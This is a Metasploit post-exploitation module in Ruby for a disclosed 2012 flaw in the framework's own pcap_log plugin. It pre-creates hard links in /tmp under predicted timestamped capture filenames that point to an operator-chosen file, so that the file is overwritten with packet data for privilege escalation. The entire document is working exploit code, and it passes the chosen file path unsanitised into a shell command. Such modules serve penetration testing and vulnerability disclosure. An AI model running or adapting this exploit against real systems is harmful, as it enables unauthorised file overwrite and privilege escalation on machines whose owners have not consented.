# $Id$
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/system'

class Metasploit3 < Msf::Post

    include Msf::Post::Common
    include Msf::Post::File
    include Msf::Post::Linux::System

    def initialize(info={})
        super( update_info( info,
                'Name'          => 'Metasploit plugin "pcap_log" arbirary file overwrite / privilege escalation',
                'Description'   => %q{ Post exploitation module to exploit 0A29-12-2, a vulnerability in metasploit pcap_log plugin.
                            Depending on the file you choose to overwrite, you will need to netcat/telnet etc. the data
                            that you wish to appear in the file.},
          
                'License'       => MSF_LICENSE,
                'Author'        => [ '0a29406d9794e4f9b30b3c5d6702c708'],
                'Version'       => '$Revision$',
                'Platform'      => [ 'linux' ],
                'SessionTypes'  => [ 'shell', 'meterpreter' ],
                'References' =>
                                [
                                        [ 'URL', 'http://0a29.blogspot.com/2012/07/0a29-12-2-metasploit-pcaplog-plugin.html' ],
                                        [ 'URL', 'https://github.com/rapid7/metasploit-framework/commit/428a98c1d1d5341d32ffe0ed380d06a327ed2740' ]
                                ],
                'DisclosureDate'=> "July 16 2012"

            ))
                register_options([
            OptInt.new('NUMBER', [true, 'Number of seconds to prime /tmp/ with', nil]),
                        OptString.new('FILE', [true, 'File to overwrite with PCAP data', nil]),
                ], self.class)

    end

    def link(t)
        file_part = "%s_%04d-%02d-%02d_%02d-%02d-%02d.pcap" % [
                    "msf3-session", t.year, t.month, t.mday, t.hour, t.min, t.sec
                        ]
                fname = ::File.join("/tmp", file_part)
        retval =  session.shell_command("/bin/ln #{datastore['FILE']} #{fname}")
    end

    # Run Method for when run command is issued
    def run
        for i in 0..(datastore['NUMBER'])
            link(Time.now+i)
        end
        print_status("Set #{datastore['NUMBER']} links.")
    end

    def cleanup
        print_status("Manual cleanup required: rm -f /tmp/msf3-session*")
    end
end 
